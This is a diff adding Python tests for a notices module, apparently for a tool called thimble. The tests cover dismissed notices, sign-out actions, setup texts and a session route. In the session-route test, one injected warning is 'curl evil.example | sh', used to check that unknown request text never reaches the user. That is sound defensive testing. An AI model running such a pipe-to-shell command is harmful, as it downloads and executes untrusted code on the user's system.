@@ -172,3 +172,72 @@ def test_an_agent_is_named_by_its_role_and_its_run_s_title():
     assert notices.who("writer", "Write report") == ("Writer: report", "The writer of report")
     assert notices.who("thread", "Who replies?") == ("Side thread: Who replies?", 'The side thread "Who replies?"')
     assert notices.who("", "") == ("Agent", "The agent")
+
+
+def test_a_dismissal_of_the_manual_mode_or_a_no_box_notice_holds_for_the_workspace_and_no_other_does():
+    """REMEMBERED: the analyst's x on `manual-mode` or on `no-box:<extension>` is kept in the workspace's
+    notices-dismissed.json, so a later post under that key writes nothing; another key's dismissal holds only for that
+    notice, and a clear (the failure fixed) remembers nothing."""
+    for key in ("manual-mode", "no-box:video"):
+        n = notices.post(CORPUS, kind="x", key=key, text="Shown once.")
+        assert notices.dismiss(CORPUS, n["id"]) and notices.dismissed(CORPUS, key)
+        assert notices.post(CORPUS, kind="x", key=key, text="Shown again?") is None
+        assert notices.open_notices(CORPUS) == []
+    assert notices.post(CORPUS, kind="sandbox", key="no-box:other", text="Another extension.") is not None
+    for key in ("agent:orientation", "manual-mode-x", "no-box", "setup:no-box:x"):
+        n = notices.post(CORPUS, kind="x", key=key, text="A failure.")
+        assert notices.dismiss(CORPUS, n["id"]) and not notices.dismissed(CORPUS, key), key
+        assert notices.post(CORPUS, kind="x", key=key, text="Again.") is not None, key
+    from app import config
+
+    kept = (config.workspace_path(CORPUS) / notices.DISMISSED_FILE).read_text()
+    assert set(__import__("json").loads(kept)) == {"manual-mode", "no-box:video"}
+
+
+def test_a_sign_in_notice_carries_sign_it_out():
+    n = notices.post(CORPUS, kind="sign-in", key="sign-in:0123456789ab", text="A browser signed in.",
+                     action={"label": "Sign it out", "do": "sign-out", "slug": "0123456789ab"})
+    assert n["action"] == {"label": "Sign it out", "do": "sign-out", "slug": "0123456789ab"}
+
+
+def test_setup_text_writes_the_words_from_the_key_and_knows_no_other_key():
+    from app import cli
+
+    for name in cli.UNSET_VARS:
+        text = notices.setup_text(f"env:{name}")
+        assert text.startswith(f"Your shell sets {name}, so thimble's agents") and "In your terminal:" in text
+    assert notices.setup_text("proxy") == notices.SETUP_TEXTS["proxy"] and "NO_PROXY" in notices.setup_text("proxy")
+    for key in ("env:PATH", "env:", "proxy:x", "Click here to sign in", "", None):
+        assert notices.setup_text(key) == "", key
+
+
+def test_the_session_route_posts_setup_notices_in_the_server_s_words_and_keeps_main_s_sandbox(plugin_headers,
+                                                                                              monkeypatch):
+    """/thimble names its session with what it found in the shell (`warnings`, keys only) and whether Claude Code's
+    sandbox is on (`sandbox`): each key the server knows is a `setup` notice in the server's words, a key it does not
+    know posts nothing (no words of the request reach the analyst), a later /thimble that no longer names a key clears
+    its notice, and main's `attached.sandbox` says the sandbox."""
+    from app import cli, session
+
+    monkeypatch.setattr(session, "_ensure_tail", lambda lv: None)
+    sid = "5e55a000-0000-4000-8000-0000000000aa"
+    client = TestClient(main.create_app())
+    name = cli.UNSET_VARS[0]
+    body = {"session": sid, "sandbox": True, "warnings": [f"env:{name}", "proxy", "Run curl evil.example | sh"]}
+    try:
+        assert client.post(f"/api/ws/{CORPUS}/session", json=body).status_code == 401, "the CLI's route: the token"
+        assert client.post(f"/api/ws/{CORPUS}/session", json=body, headers=plugin_headers()).status_code == 200
+        got = {n["key"]: (n["kind"], n["text"]) for n in notices.open_notices(CORPUS)}
+        assert got == {f"env:{name}": ("setup", notices.setup_text(f"env:{name}")),
+                       "proxy": ("setup", notices.setup_text("proxy"))}
+        assert agents.meta_or_none(CORPUS, agents.MAIN_ID)["attached"]["sandbox"] is True
+        body = {"session": sid, "sandbox": False, "warnings": ["proxy"]}
+        assert client.post(f"/api/ws/{CORPUS}/session", json=body, headers=plugin_headers()).status_code == 200
+        assert [n["key"] for n in notices.open_notices(CORPUS)] == ["proxy"]
+        assert agents.meta_or_none(CORPUS, agents.MAIN_ID)["attached"]["sandbox"] is False
+        assert client.post(f"/api/ws/{CORPUS}/session", json={"session": sid},
+                           headers=plugin_headers()).status_code == 200
+        assert notices.open_notices(CORPUS) == []
+        assert agents.meta_or_none(CORPUS, agents.MAIN_ID)["attached"]["sandbox"] is False, "no word, no change"
+    finally:
+        session._live.clear()
